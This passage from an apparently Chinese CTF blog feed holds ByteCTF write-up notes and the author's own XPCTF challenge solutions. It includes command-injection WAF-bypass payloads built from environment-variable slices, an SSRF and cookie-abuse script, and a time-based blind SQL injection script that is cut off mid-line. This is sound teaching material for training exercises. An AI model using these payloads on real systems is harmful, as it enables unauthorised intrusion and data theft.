href="https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.java%EF%BC%8C%E5%AE%83%E7%9A%84%E9%9D%99%E6%80%81%E4%BB%A3%E7%A0%81%E5%9D%97%E4%B8%AD%E5%AE%9A%E4%B9%89%E4%BA%86%E9%99%90%E5%88%B6%E7%B1%BB%E5%92%8C%E6%96%B9%E6%B3%95%E7%9A%84%E9%BB%91%E5%90%8D%E5%8D%95%EF%BC%9A">https://github.com/jfinal/jfinal/blob/master/src/main/java/com/jfinal/template/expr/ast/MethodKit.java，它的静态代码块中定义了限制类和方法的黑名单：</a></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">String[] ms = &#123;</span><br><span class="line"><span class="string">&quot;getClass&quot;</span>, <span class="string">&quot;getDeclaringClass&quot;</span>, <span class="string">&quot;forName&quot;</span>, <span class="string">&quot;newInstance&quot;</span>, <span class="string">&quot;getClassLoader&quot;</span>,</span><br><span class="line"><span class="string">&quot;invoke&quot;</span>, <span class="comment">// &quot;getMethod&quot;, &quot;getMethods&quot;, // &quot;getField&quot;, &quot;getFields&quot;,</span></span><br><span class="line"><span class="string">&quot;notify&quot;</span>, <span class="string">&quot;notifyAll&quot;</span>, <span class="string">&quot;wait&quot;</span>,</span><br><span class="line"><span class="string">&quot;exit&quot;</span>, <span class="string">&quot;loadLibrary&quot;</span>, <span class="string">&quot;halt&quot;</span>, <span class="comment">// &quot;load&quot;,</span></span><br><span class="line"><span class="string">&quot;stop&quot;</span>, <span class="string">&quot;suspend&quot;</span>, <span class="string">&quot;resume&quot;</span>, <span class="comment">// &quot;setDaemon&quot;, &quot;setPriority&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;removeForbiddenClass&quot;</span>,</span><br><span class="line"><span class="string">&quot;removeForbiddenMethod&quot;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在拜读了 @Mrkaixin 大大大师傅（谭总牛逼）的 WP 后，学习到了可以通过调用一些类的静态方法来获取实例，比如 <code>net.sf.ehcache.util.ClassLoaderUtil createNewInstance</code>，这个方法没被黑名单过滤（推荐一波这个网站：<a href="https://www.tabnine.com/code%EF%BC%8C%E6%90%9C">https://www.tabnine.com/code，搜</a> JAVA 代码很好用）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createNewInstance</span><span class="params">(String className)</span> <span class="keyword">throws</span> CacheException </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> createNewInstance(className, <span class="keyword">new</span> Class[<span class="number">0</span>], <span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>靶机无了，寄！</p><h2 id="Web-Aginx"><a href="#Web-Aginx" class="headerlink" title="Web-Aginx"></a>Web-Aginx</h2><p>面向大师傅 WP 的解题：<a href="https://impakho.com/post/bytectf-2021-aginx-writeup">https://impakho.com/post/bytectf-2021-aginx-writeup</a></p><h2 id="Misc-frequently"><a href="#Misc-frequently" class="headerlink" title="Misc-frequently"></a>Misc-frequently</h2><p>被🍋带着出了一半 flag，彳亍，赛后再跟着🍋的 WP 复现了一下，最后还是出了，彳亍。</p><p>在 WireShark 分析可以发现发现大量来自 xxxx.bytedanec.net 的 DNS 查询请求，将其域名的第一段分离出来，使用 Base64 进行解码可以得到一张没用的图片，继续进行分析，将剩余 DNS 请求中的 i、o 提取出来进行处理（CyberChef）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;i\\n&#39;&#125;,&#39;1&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39;o\\n&#39;&#125;,&#39;0&#39;,true,false,true,false)</span><br><span class="line">Find_&#x2F;_Replace(&#123;&#39;option&#39;:&#39;Regex&#39;,&#39;string&#39;:&#39; &#39;&#125;,&#39;&#39;,true,false,true,false)</span><br><span class="line">From_Binary(&#39;Space&#39;,8)</span><br><span class="line"></span><br><span class="line">The first part of flag: ByteCTF&#123;^_^enJ0y&amp;y0u9</span><br></pre></td></tr></table></figure><p>得到第一段 flag。随后可以在流量包中发现 DHCP 包，将 ACK 中包含的 IP Address Lease Time 提取出来可以得到后一半 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure><p>完整 flag：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ByteCTF&#123;^_^enJ0y&amp;y0u9se1f_wIth_m1sc^_^&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XPCTF@HUT 出题笔记</title>
      <link href="2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
      <url>2021/10/16/XPCTF-HUT-%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<p>给大二出了点简单题玩玩。感觉做得还彳亍，有点意思。</p><h2 id="Web-你在扫尼玛的东方明珠塔扫呢你"><a href="#Web-你在扫尼玛的东方明珠塔扫呢你" class="headerlink" title="Web-你在扫尼玛的东方明珠塔扫呢你"></a>Web-你在扫尼玛的东方明珠塔扫呢你</h2><p>本题主要考察 shell 命令执行的一些小技巧，偏简单题。给出了题目附件 flag.sh：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/usr/bin/env bash</span></span><br><span class="line">echo $FLAG &gt; /flag</span><br><span class="line"></span><br><span class="line">export FLAG=not_flag</span><br><span class="line">FLAG=not_flag</span><br><span class="line"></span><br><span class="line">apache2-foreground</span><br></pre></td></tr></table></figure><p>这里主要是提示 flag 在 /flag 以及提示环境变量中有 FLAG 可以用</p><p>题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Author: Du1L0v3</span></span><br><span class="line"><span class="comment"> * Description: 就这？李在嗦泥🐎呢，真是麻雀啄🐂丁丁，雀食牛逼</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$cnm</span> = file_get_contents(<span class="string">&quot;/flag.sh&quot;</span>);</span><br><span class="line"><span class="variable">$nmsl</span> = str_replace(<span class="string">&quot;apache2-foreground&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$cnm</span>);</span><br><span class="line">shell_exec(<span class="variable">$nmsl</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]| |BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|~|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = shell_exec(<span class="string">&quot;bash -c &#x27;ping &quot;</span> . <span class="variable">$url</span> . <span class="string">&quot; -c 1&#x27;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (strstr(<span class="variable">$res</span>, <span class="string">&quot;flag&quot;</span>) || strstr(<span class="variable">$res</span>, <span class="string">&quot;xpctf&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;why you so vegetable&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="variable">$res</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you want to do what?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;wai bi ba bo&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主要需要考虑如何去闭合 <code>bash -c &#39;ping &quot; . $url . &quot; -c 1&#39;</code> 以及闭合之后如何绕过 WAF 执行命令</p><p>首先不考虑存在 WAF 可以轻松构造出：<code>url=127.0.0.1|ls%26ping 127.0.0.1</code>（&amp; 需要 urlencode 为 %26）</p><p>这样构造就使两头闭合，从而可以在中间执行任意命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1 | ls &amp; ping 127.0.0.1 -c 1</span><br></pre></td></tr></table></figure><p>但是我们的小写字母被过滤了，不过大写字母和数字没有被过滤，所以可以尝试利用环境变量截取关键字符来拼接命令：（因为输出如果有 flag 或者 xpctf 字符串就会过滤，所以我们需要用 base64 输出，也可以用 rev）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">空格: $IFS$9</span><br><span class="line">/: $&#123;PATH:0:1&#125;</span><br><span class="line">/bin/ls: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;</span><br><span class="line">/usr/bin/base64: $&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64</span><br><span class="line">/bin/cat: $&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;</span><br><span class="line">/flag: $&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;</span><br></pre></td></tr></table></figure><p>拼接得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls / | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:5:1&#125;$&#123;PATH:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br><span class="line">cat /flag  | base64</span><br><span class="line">127.0.0.1|$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;FLAG:6:1&#125;$&#123;FLAG:2:1&#125;$IFS$9$&#123;PATH:0:1&#125;$&#123;FLAG:4:4&#125;|$&#123;PATH:0:5&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;$&#123;PATH:12:1&#125;???64%26$&#123;PATH:0:1&#125;$&#123;PATH:12:3&#125;$&#123;PATH:0:1&#125;?$&#123;PATH:13:2&#125;$&#123;FLAG:7:1&#125;$IFS$9127.0.0.1</span><br></pre></td></tr></table></figure><p>才发现不要构造 ping 闭合后面的，我是傻逼。。</p><p>可以适当做一下拓展，把 WAF 稍微换一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]| |FLAG|HOME|PWD|PATH|MAIL|LANG|BASH|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|HOSTNAME|EUID|LANG|LESSOPEN|LINES|OLD|MACHTYPE|PPID|SHLVL|FUNCNAME|OPTIND|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|#|%|\&gt;|\&lt;|\&#x27;|\&quot;|\`|_|\,/&#x27;</span>, <span class="variable">$url</span>)</span><br></pre></td></tr></table></figure><p>也没啥，就把数字过滤了，再加上过滤了点前面用到的啥 PATH、FLAG。。。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">OPTERR=1</span><br><span class="line">HOSTTYPE=x86_64</span><br><span class="line">UID=1001</span><br><span class="line">TERM=</span><br><span class="line">EUID=0</span><br><span class="line">ID=0</span><br><span class="line">OSTYPE=linux-gnu</span><br><span class="line">LOGNAME=root</span><br><span class="line">SHELL=/sbin/nologin</span><br><span class="line">SHELLOPTS=braceexpand:hashall:interactive-comments:posix</span><br><span class="line"></span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR = 1</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;UID:<span class="variable">$OPTERR</span>:<span class="variable">$OPTERR</span>&#125; = 0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;HOSTTYPE:<span class="variable">$OPTERR</span>:OPTERR&#125; = 8</span></span><br><span class="line"></span><br><span class="line">空格 -&gt; $&#123;IFS&#125;</span><br><span class="line">/ -&gt; $&#123;SHELL::$OPTERR&#125;</span><br><span class="line">l -&gt; $&#123;OSTYPE::$OPTERR&#125;</span><br><span class="line">i -&gt; $&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span><br><span class="line">d -&gt; $&#123;TERM::$OPTERR&#125;</span><br><span class="line">u -&gt; $&#123;OSTYPE:~A:$OPTERR&#125;</span><br><span class="line">1</span><br><span class="line">0</span><br><span class="line">8</span><br><span class="line">4 -&gt; $&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">x</span><br><span class="line">r -&gt; $&#123;LOGNAME::$OPTERR&#125;</span><br><span class="line">n -&gt; $&#123;SHELL:~A:$OPTERR&#125;</span><br><span class="line">b -&gt; $&#123;SHELLOPTS::$OPTERR&#125;</span><br><span class="line">s -&gt; $&#123;HISTCONTROL:~A:$OPTERR&#125;</span><br><span class="line">t -&gt; $&#123;LOGNAME:~A:$OPTERR&#125;</span><br><span class="line"></span><br><span class="line">1.1 -&gt; $OPTERR.$OPTER</span><br><span class="line">/bin/ -&gt; /?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/bin/dir -&gt; /?i?/di? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;TERM::$OPTERR&#125;$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?</span><br><span class="line">/usr/bin/ -&gt; /u??/?i?/ -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;</span><br><span class="line">/usr/bin/base64 -&gt; /usr/bin/b?s??4 -&gt; $&#123;SHELL::$OPTERR&#125;$&#123;OSTYPE:~A:$OPTERR&#125;??$&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELLOPTS::$OPTERR&#125;????$&#123;HOSTTYPE:~A:$OPTERR&#125;</span><br><span class="line">/bin/tac -&gt; /?i?/t?? -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;LOGNAME:~A:$OPTERR&#125;??</span><br><span class="line">/bin/nl -&gt; $&#123;SHELL::$OPTERR&#125;?$&#123;OSTYPE:$OPTERR:$OPTERR&#125;?$&#123;SHELL::$OPTERR&#125;$&#123;SHELL:~A:$OPTERR&#125;$&#123;OSTYPE::$OPTERR&#125;</span><br></pre></td></tr></table></figure><p>因为没了数字，所以没办法用 127.0.0.1 了。。可以随便糊弄个 1.1，简单构造一波：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/bin/dir / | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;TERM::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br><span class="line">/bin/nl /flag | base64</span><br><span class="line"><span class="meta">$</span><span class="bash">OPTERR.<span class="variable">$OPTERR</span>|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELL:~A:$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span><span class="variable">$&#123;IFS&#125;</span><span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE::$OPTERR&#125;</span>??|<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;OSTYPE:~A:$OPTERR&#125;</span>??<span class="variable">$&#123;SHELL::$OPTERR&#125;</span>?<span class="variable">$&#123;OSTYPE:$OPTERR:$OPTERR&#125;</span>?<span class="variable">$&#123;SHELL::$OPTERR&#125;</span><span class="variable">$&#123;SHELLOPTS::$OPTERR&#125;</span>????<span class="variable">$&#123;HOSTTYPE:~A:$OPTERR&#125;</span>%26</span></span><br></pre></td></tr></table></figure><h2 id="Web-重生之我是赌圣"><a href="#Web-重生之我是赌圣" class="headerlink" title="Web-重生之我是赌圣"></a>Web-重生之我是赌圣</h2><p>考察写脚本的能力，考点：</p><ul><li>ssrf + 弱密码</li><li>利用赌场Cookie存储漏洞</li></ul><p>直接贴脚本吧，这题是最简单的了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://b8a1bad7-9300-453d-88e2-ce7a5684cf65.node.oj.huts.ec/&quot;</span></span><br><span class="line">conn = requests.get(url=url + <span class="string">&quot;index.php?url=http://127.0.0.1/login.php?username=admin%26password=admin&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> conn.status_code == <span class="number">200</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;/var/www/html/fuck_chutiren.txt&quot;</span>)</span><br><span class="line">conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>)</span><br><span class="line">cook = conn.cookies</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    conn = requests.post(url=url + <span class="string">&quot;main.php&quot;</span>, cookies=cook)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;xpctf&#123;&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;险胜&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&quot;恭喜&quot;</span> <span class="keyword">in</span> conn.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;芜湖&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(conn.cookies[<span class="string">&#x27;num&#x27;</span>])</span><br><span class="line">        <span class="comment"># print(conn.text)</span></span><br><span class="line">        cook = conn.cookies</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h2 id="Web-👴如何花忒奶奶的一天逃离监狱"><a href="#Web-👴如何花忒奶奶的一天逃离监狱" class="headerlink" title="Web-👴如何花忒奶奶的一天逃离监狱"></a>Web-👴如何花忒奶奶的一天逃离监狱</h2><p>这题挺有意思的，本来是源自我和室友一起写的一个学习项目——“监狱管理系统”，不过👴偷偷在注册的后端溜了一个无伤大雅的小洞，一开始自己测试的时候是一直在尝试报错注入，然后写入文件读取，然后一直失败，最后去找了谭总聊了下，发现还是思维局限了，一直想着要报错写文件，忘了可以时间盲注，脑子卡了卡了。后面和🍋聊天的时候，🍋说了句贼有道理的话：“你总不能让别人一边写入数据一边导出数据吧”，最后就放弃了傻逼报错注入，顺带设了个小坑，将我报错注入测试中用过的 payload 放到了 robots.txt 里面，不过也提示了后面的双注入。</p><p>直接贴脚本好了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7390941e-b2b7-485b-9c3c-caa29a3f2c6b.node.oj.huts.ec/man/register&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_length = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select database()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select user()))=%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (length((select version()))=%d) then sleep(1.8) else 1 end)) #&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">payload_data = &#123;</span><br><span class="line">    <span class="string">&quot;database&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select database()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;user&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select user()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;version&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select version()),%d,1))&lt;%d) then sleep(1.8) else 1 end)) #&quot;</span>,</span><br><span class="line">    <span class="string">&quot;schemata0&quot;</span>: <span class="string">&quot;0&#x27; or (case when (ascii(substr((select concat(schema_name) from 